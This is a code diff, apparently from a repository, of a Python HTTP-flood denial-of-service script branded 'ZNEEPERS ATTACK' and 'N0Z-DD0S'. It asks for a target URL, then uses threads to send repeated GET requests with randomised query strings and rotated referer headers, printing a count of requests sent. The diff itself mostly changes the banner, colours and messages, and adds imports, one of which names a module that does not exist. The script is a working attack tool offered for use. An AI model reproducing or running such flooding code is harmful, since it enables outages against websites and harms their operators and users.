@@ -2,7 +2,11 @@
 import os
 import requests
 import threading
+import date
+import time
+import sys
 import random
+import string
 
 
 class bcolors:
@@ -26,25 +30,25 @@ if os.name == 'nt':
 else:
     os.system("clear")
 print(" ")                                  
-print("\033[31m       ©©      ©     ©© ©    © © © ©©   © © © ©©      \033[0m")
-print("\033[31m       ©© ©    ©   ©© • • ©  •    ©©    •    ©©       \033[0m")                 
-print("\033[31m       ©©  ©   ©   ©© • • ©      ©© •       ©© •      \033[0m")                 
-print("\033[96m       ©©   ©  ©   ©©  •  ©     ©©  •      ©©  •      \033[0m")             
-print("\033[96m       ©©  • © ©   ©©     ©    ©©         ©©          \033[0m")            
-print("\033[96m       ©©  • • ©   • ©© ©     ©© © © ©   ©© © © ©     \033[0m")            
-print("\033[96m       ••  • • •   • •• •     ••   • •   ••    •      \033[0m")            
-print("\033[96m        •  •   •   •   •      •  •  •    •   •        \033[0m")             
-print("\033[33m⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵  \033[0m")     
-print("\033[1m[[          Z  N  E  E  P  E  R  S    A  T  T  A  C  K              \033[0m")    
-print("\033[33m[[                       design By: ZA'99                          \033[0m")   
-print("\033[1m[[                   —°0  please use wisely  0°—                                      \033[0m")    
-print("\033[33m[[⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵\033[0m")      
+print("\033[31m            ©©      ©     ©© ©    © © © ©©   © © © ©©      \033[0m")
+print("\033[31m            ©© ©    ©   ©© • • ©  •    ©©    •    ©©       \033[0m")                 
+print("\033[31m            ©©  ©   ©   ©© • • ©      ©© •       ©© •      \033[0m")                 
+print("\033[96m            ©©   ©  ©   ©©  •  ©     ©©  •      ©©  •      \033[0m")             
+print("\033[96m            ©©  • © ©   ©©     ©    ©©         ©©          \033[0m")            
+print("\033[96m            ©©  • • ©   • ©© ©     ©© © © ©   ©© © © ©     \033[0m")            
+print("\033[96m            ••  • • •   • •• •     ••   • •   ••    •      \033[0m")            
+print("\033[96m             •  •   •   •   •      •  •  •    •   •        \033[0m")             
+print("\033[33m⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵\033[0m")     
+print("\033[1m          Z  N  E  E  P  E  R  S    A  T  T  A  C  K                                        \033[0m")    
+print("\033[33m                      design By: ZA'99                                                     \033[0m")   
+print("\033[1m                  —°0  please use wisely  0°—                                               \033[0m")    
+print("\033[33m⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵\033[0m")      
 print("\033[32m-------------------------------->>>\033[0m")
 url = input("URL:  ").strip()
 
 
 count = 0
-headers = [5000]
+headers = []
 referer = [
     "https://google.it/",
     "https://facebook.com/",
@@ -87,9 +91,11 @@ class httpth1(threading.Thread):
                 randomized_url = url + "?" + genstr(random.randint(3, 10))
                 requests.get(randomized_url, headers=headers)
                 count += 1
-                print ("{0}\033[1mN0Z-DD0S  [\033[4mREQUEST SEND TO  [\033[33m" +url+ " \033[0m".format(count))
+                print ("{0}\033[96mN0Z-DD0S  [\033[4mREQUEST SEND TO  [\033[33m" +url+ " \033[0m".format(count))
             except requests.exceptions.ConnectionError:
-                print ("[Server might be down!]")
+                
+                
+                print ("[Server maybe down!]")
                 pass
             except requests.exceptions.InvalidSchema:
                 print ("[URL Error]")
